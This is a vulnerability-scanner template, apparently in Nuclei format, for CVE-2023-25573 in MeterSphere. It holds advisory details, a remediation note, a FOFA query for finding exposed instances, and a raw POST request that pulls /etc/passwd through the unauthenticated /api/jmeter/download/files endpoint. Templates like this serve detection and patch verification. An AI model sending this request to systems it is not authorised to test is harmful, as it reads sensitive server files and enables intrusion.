id: CVE-2023-25573

info:
  name: MeterSphere arbitrary file download vulnerability - Arbitrary file download vulnerability
  author: permit
  severity: high
  description: |
    MeterSphere is an all-in-one open source continuous testing platform that covers functions such as test tracking, interface testing, performance testing, and team collaboration. It is fully compatible with open source and mainstream standards such as JMeter, Postman, and Swagger. According to official description, there is an incorrect access control vulnerability in the interface '/api/jmeter/download/files', which allows any user to download any file without authentication.
  reference:
    - https://github.com/metersphere/metersphere/security/advisories/GHSA-mcwr-j9vm-5g8h
    - https://nvd.nist.gov/vuln/detail/CVE-2023-25573
  remediation: Please update to MeterSphere >= 1.20.20 lts or MeterSphere >= 2.7.1ã€‚
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cve-id: CVE-2023-25573
    cwe-id: CWE-862
    cpe: cpe:2.3:a:metersphere:metersphere:2.0.1:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    fofa-query: app="FIT2CLOUD-MeterSphere"
    verified: true
  tags: cve,cve2023,MeterSphere

http:
  - raw:
      - |
        POST /api/jmeter/download/files HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "reportId":"123123123",
          "bodyFiles":[
          {
            "id":"aaa",
            "name":"/etc/passwd"
          }
          ]
        }

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "123123123.zip"
      
      - type: status
        status:
          - 200

# Enhanced by md on 2023/06/18
